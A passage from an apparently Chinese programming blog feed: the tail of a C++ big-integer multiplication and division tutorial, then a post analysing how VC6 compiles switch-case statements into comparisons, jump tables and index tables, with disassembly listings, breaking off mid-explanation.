class="title">mul</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> <span class="keyword">int</span>&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">if</span> (B == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 当A的各个位都已经乘完乘数后，如果还有进位</span></span><br><span class="line">    <span class="comment">// 则将进位的整数分解成若干个整数存放到答案数组中</span></span><br><span class="line">    <span class="comment">// 因为A[i] * B的进位可以不只是1位数，可能是多位的整数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        result += A[i] * B;</span><br><span class="line">        <span class="comment">// 求当前位置上应该留下的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 求进位了多少值</span></span><br><span class="line">        result = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> (result) &#123;</span><br><span class="line">          ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">          result = result / <span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大整数除法-1">大整数除法</h2><p>要求除数一定不为0，且A为高精度整数，b为低精度整数，且A和b都为非负数，A不小于b。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">div</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">int</span> b, <span class="keyword">int</span>&amp; r)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// r为余数，且为哨兵</span></span><br><span class="line">    r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        r = r * <span class="number">10</span> + A[i];</span><br><span class="line">        q.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">        r = r % b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 由于大整数的存储是按照小端序存储的，因此需要将最后的结果逆置</span></span><br><span class="line">    <span class="built_in">reverse</span>(q.<span class="built_in">begin</span>(), q.<span class="built_in">end</span>());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 去除前导0</span></span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; q.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        q.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;高精度大整数运算&quot;&gt;高精度大整数运算&lt;/h1&gt;
&lt;p&gt;只针对C++来说，因为C++没有大整数类，而java具有大整数类，python的整数是无限位的&lt;/p&gt;
&lt;p&gt;对于大数运算，一般有以下几种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&quot;ma</summary>
      
    
    
    
    <category term="算法" scheme="https://4st.tech/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="高精度" scheme="https://4st.tech/tags/%E9%AB%98%E7%B2%BE%E5%BA%A6/"/>
    
    <category term="大整数运算" scheme="https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"/>
    
    <category term="C++大整数运算" scheme="https://4st.tech/tags/C-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>switch-case逆向分析与还原</title>
    <link href="https://4st.tech/2021/08/07/switch-case-ni-xiang-fen-xi-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/08/07/switch-case-ni-xiang-fen-xi-yu-huan-yuan/</id>
    <published>2021-08-07T04:51:38.000Z</published>
    <updated>2021-08-07T04:55:30.755Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大纲">大纲</h1><ul><li>case的数量小于等于3个，且case值连续</li><li>case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7</li><li>case的数量大于3个，且case值相隔较大，且最大case值和最小case值之间的间隔不能超过255</li><li>case的值大于3个，且case值较为离散。</li><li>混合方案。当不能单独用上述4种优化方案时使用。当个数小于等于3个，直接比较就行了，就不再进行折半查找了。</li></ul><h1 id="测试环境">测试环境</h1><p>MSVC + VC6 + Release，速度优先编译选项。选用VC6的原因是编译器没有其他额外的操作，如：安全cookie之类的信息，方便观察。其实switch-case的这几种方式在VS2019中也是一样的</p><h1 id="优化方案一直接if-else">优化方案一：直接if-else</h1><p>适用于：case的数量小于等于3个，且case值连续的情况。</p><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;case 1&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;case 2&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;case 3&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 dec     eax</span><br><span class="line">.text:00401005                 jz      short LBL_CASE1</span><br><span class="line">.text:00401005</span><br><span class="line">.text:00401007                 dec     eax</span><br><span class="line">.text:00401008                 jz      short LBL_CASE2</span><br><span class="line">.text:00401008</span><br><span class="line">.text:0040100A                 dec     eax</span><br><span class="line">.text:0040100B                 jnz     short LBL_EXIT</span><br><span class="line">.text:0040100D LBL_CASE3:                              ; &quot;case 3&quot;</span><br><span class="line">.text:0040100D                 push    offset s-&gt;Case3</span><br><span class="line">.text:00401012                 call    printf</span><br><span class="line">.text:00401012</span><br><span class="line">.text:00401017                 add     esp, 4</span><br><span class="line">.text:0040101A                 xor     eax, eax</span><br><span class="line">.text:0040101C                 retn</span><br><span class="line">.text:0040101C</span><br><span class="line">.text:0040101D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:0040101D LBL_CASE2:                              ; CODE XREF: _main+8j</span><br><span class="line">.text:0040101D                 push    offset s-&gt;Case2 ; &quot;case 2&quot;</span><br><span class="line">.text:00401022                 call    printf</span><br><span class="line">.text:00401022</span><br><span class="line">.text:00401027                 add     esp, 4</span><br><span class="line">.text:0040102A                 xor     eax, eax</span><br><span class="line">.text:0040102C                 retn</span><br><span class="line">.text:0040102C</span><br><span class="line">.text:0040102D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040102D</span><br><span class="line">.text:0040102D LBL_CASE1:                              ; CODE XREF: _main+5j</span><br><span class="line">.text:0040102D                 push    offset s-&gt;Case1 ; &quot;case 1&quot;</span><br><span class="line">.text:00401032                 call    printf</span><br><span class="line">.text:00401032</span><br><span class="line">.text:00401037                 add     esp, 4</span><br><span class="line">.text:00401037</span><br><span class="line">.text:0040103A</span><br><span class="line">.text:0040103A LBL_EXIT:                               ; CODE XREF: _main+Bj</span><br><span class="line">.text:0040103A                 xor     eax, eax</span><br><span class="line">.text:0040103C                 retn</span><br><span class="line">.text:0040103C</span><br><span class="line">.text:0040103C _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，其为了提高速度，其直接将共有的退出代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor     eax, eax</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>放到了各个case后面，直接退出了。</p><p>其在比较到底是选择哪个case的时候，与if-else的差不多：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmp xxxx</span><br><span class="line">jz xxxx; 跳转到对应的case代码块</span><br><span class="line">cmp xxxx</span><br><span class="line">jz xxxx</span><br><span class="line">cmp xxxx</span><br><span class="line">jnz xxxx; default / case_end</span><br></pre></td></tr></table></figure><p>当没有break的时候，则生成的引导表是按照你写的顺序；如果有break，则顺序就无所谓了。</p><h1 id="优化方案二跳转表方案">优化方案二：跳转表方案</h1><p>适用于：case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7的情况。</p><p>实验代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 2&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 3&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 4&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 5&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 6&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;          </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 dec     eax</span><br><span class="line">.text:00401005                 cmp     eax, 5          ; switch 6 cases</span><br><span class="line">.text:00401008                 ja      short LBL_DEFAULT ; jumptable 0040100A default case</span><br><span class="line">.text:00401008</span><br><span class="line">.text:0040100A                 jmp     ds:aryJumpTable[eax*4] ; switch jump</span><br><span class="line">.text:0040100A</span><br><span class="line">.text:00401011</span><br><span class="line">.text:00401011 LBL_CASE1:                              ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401011                 push    offset s-&gt;Case1 ; jumptable 0040100A case 0</span><br><span class="line">.text:00401016                 call    printf</span><br><span class="line">.text:00401016</span><br><span class="line">.text:0040101B                 add     esp, 4</span><br><span class="line">.text:0040101E                 xor     eax, eax</span><br><span class="line">.text:00401020                 retn</span><br><span class="line">.text:00401020</span><br><span class="line">.text:00401021 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401021</span><br><span class="line">.text:00401021 LBL_CASE2:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401021                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401021                 push    offset s-&gt;Case2 ; jumptable 0040100A case 1</span><br><span class="line">.text:00401026                 call    printf</span><br><span class="line">.text:00401026</span><br><span class="line">.text:0040102B                 add     esp, 4</span><br><span class="line">.text:0040102E                 xor     eax, eax</span><br><span class="line">.text:00401030                 retn</span><br><span class="line">.text:00401030</span><br><span class="line">.text:00401031 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401031</span><br><span class="line">.text:00401031 LBL_CASE3:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401031                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401031                 push    offset s-&gt;Case3 ; jumptable 0040100A case 2</span><br><span class="line">.text:00401036                 call    printf</span><br><span class="line">.text:00401036</span><br><span class="line">.text:0040103B                 add     esp, 4</span><br><span class="line">.text:0040103E                 xor     eax, eax</span><br><span class="line">.text:00401040                 retn</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401041 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401041</span><br><span class="line">.text:00401041 LBL_CASE4:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401041                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401041                 push    offset s-&gt;Case4 ; jumptable 0040100A case 3</span><br><span class="line">.text:00401046                 call    printf</span><br><span class="line">.text:00401046</span><br><span class="line">.text:0040104B                 add     esp, 4</span><br><span class="line">.text:0040104E                 xor     eax, eax</span><br><span class="line">.text:00401050                 retn</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401051 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401051</span><br><span class="line">.text:00401051 LBL_CASE5:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401051                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401051                 push    offset s-&gt;Case5 ; jumptable 0040100A case 4</span><br><span class="line">.text:00401056                 call    printf</span><br><span class="line">.text:00401056</span><br><span class="line">.text:0040105B                 add     esp, 4</span><br><span class="line">.text:0040105E                 xor     eax, eax</span><br><span class="line">.text:00401060                 retn</span><br><span class="line">.text:00401060</span><br><span class="line">.text:00401061 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401061</span><br><span class="line">.text:00401061 LBL_CASE6:                              ; CODE XREF: _main+Aj</span><br><span class="line">.text:00401061                                         ; DATA XREF: .text:aryJumpTableo</span><br><span class="line">.text:00401061                 push    offset s-&gt;Case6 ; jumptable 0040100A case 5</span><br><span class="line">.text:00401066                 call    printf</span><br><span class="line">.text:00401066</span><br><span class="line">.text:0040106B                 add     esp, 4</span><br><span class="line">.text:0040106E                 xor     eax, eax</span><br><span class="line">.text:00401070                 retn</span><br><span class="line">.text:00401070</span><br><span class="line">.text:00401071 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401071</span><br><span class="line">.text:00401071 LBL_DEFAULT:                            ; CODE XREF: _main+8j</span><br><span class="line">.text:00401071                 push    offset s-&gt;Default ; jumptable 0040100A default case</span><br><span class="line">.text:00401076                 call    printf</span><br><span class="line">.text:00401076</span><br><span class="line">.text:0040107B                 add     esp, 4</span><br><span class="line">.text:0040107E                 xor     eax, eax</span><br><span class="line">.text:00401080                 retn</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 _main           endp</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401081                 align 4</span><br><span class="line">.text:00401084 aryJumpTable    dd offset LBL_CASE1     ; DATA XREF: _main+Ar</span><br><span class="line">.text:00401084                 dd offset LBL_CASE2     ; jump table for switch statement</span><br><span class="line">.text:00401084                 dd offset LBL_CASE3</span><br><span class="line">.text:00401084                 dd offset LBL_CASE4</span><br><span class="line">.text:00401084                 dd offset LBL_CASE5</span><br><span class="line">.text:00401084                 dd offset LBL_CASE6</span><br><span class="line">.text:0040109C                 align 10h</span><br></pre></td></tr></table></figure><p>跳转表jumpTable是个指针数组，里面存放着各个CASE的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00401084 aryJumpTable    dd offset LBL_CASE1     ; DATA XREF: _main+Ar</span><br><span class="line">.text:00401084                 dd offset LBL_CASE2     ; jump table for switch statement</span><br><span class="line">.text:00401084                 dd offset LBL_CASE3</span><br><span class="line">.text:00401084                 dd offset LBL_CASE4</span><br><span class="line">.text:00401084                 dd offset LBL_CASE5</span><br><span class="line">.text:00401084                 dd offset LBL_CASE6</span><br></pre></td></tr></table></figure><p>在switch-case的入口处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 dec     eax</span><br><span class="line">.text:00401005                 cmp     eax, 5          ; switch 6 cases</span><br><span class="line">.text:00401008                 ja      short LBL_DEFAULT ; jumptable 0040100A default case</span><br><span class="line">.text:00401008</span><br><span class="line">.text:0040100A                 jmp     ds:aryJumpTable[eax*4] ; switch jump</span><br></pre></td></tr></table></figure><p>可以发现其为了利用跳转表的下标来进行寻址，需要将case值与数组下标相对应，因此<strong>需要减掉最小的那个case值</strong>。在本例中，也就是需要减掉最小的case值1，因此在入口处，首先将要测试的值减去1，然后与最大下标进行比较，如果大于，则说明是不在case范围内，直接跳转到default处进行处理即可，否则直接利用数组下标寻址公式来进行寻址到正确的case地址即可。</p><p>由于是使用的指针数组来进行寻址的，所以当case打乱的情况下，其填充进该数组中也是有序的，所以在生成跳转表的时候，跟你是否写的有序无关。</p><p>还原时，<strong>别忘了将case值加上最小的那个case值，才能得到真正的case值</strong>。</p><h1 id="优化方案3索引表和跳转表组合方案">优化方案3：索引表和跳转表组合方案</h1><p>适用于：case的数量大于3个，且case值相隔较大，且最大case值和最小case值之间的间隔不能超过255的情况。</p><p>实验代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 40&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">91</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 91&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">62</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 62&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">73</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 73&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 14&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 25&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;          </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于该实验代码，其在跳转表的基础上，又多了一张表，其大小为1个字节，即：可以表示的最大范围是0 - 255,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 add     eax, 0FFFFFFF2h</span><br><span class="line">.text:00401007                 cmp     eax, 4Dh        ; switch 78 cases</span><br><span class="line">.text:0040100A                 ja      short LBL_DEFAULT ; jumptable 00401014 default case</span><br><span class="line">.text:0040100A</span><br><span class="line">.text:0040100C                 xor     ecx, ecx</span><br><span class="line">.text:0040100E                 mov     cl, ds:indexTable[eax]</span><br><span class="line">.text:00401014                 jmp     ds:jumpTable[ecx*4] ; switch jump</span><br></pre></td></tr></table></figure><p>对应的两张表分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0040108C jumpTable       dd offset loc_40105B    ; DATA XREF: _main+14r</span><br><span class="line">.text:0040108C                 dd offset loc_40106B    ; jump table for switch statement</span><br><span class="line">.text:0040108C                 dd offset loc_40101B</span><br><span class="line">.text:0040108C                 dd offset loc_40103B</span><br><span class="line">.text:0040108C                 dd offset loc_40104B</span><br><span class="line">.text:0040108C                 dd offset loc_40102B</span><br><span class="line">.text:0040108C                 dd offset LBL_DEFAULT</span><br><span class="line"></span><br><span class="line">.text:004010A8 indexTable      db 0,6,6,6,6,6,6,6,6,6  ; DATA XREF: _main+Er</span><br><span class="line">.text:004010A8                 db 6,1,6,6,6,6,6,6,6,6  ; indirect table for switch statement</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,2,6,6,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,6,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,3,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,6,4</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,6,6,6</span><br><span class="line">.text:004010A8                 db 6,6,6,6,6,6,6,5</span><br></pre></td></tr></table></figure><p>可以发现，在索引表indexTable中，6代表的是跳转表的下标，即：<code>LBL_DEFAULT</code> 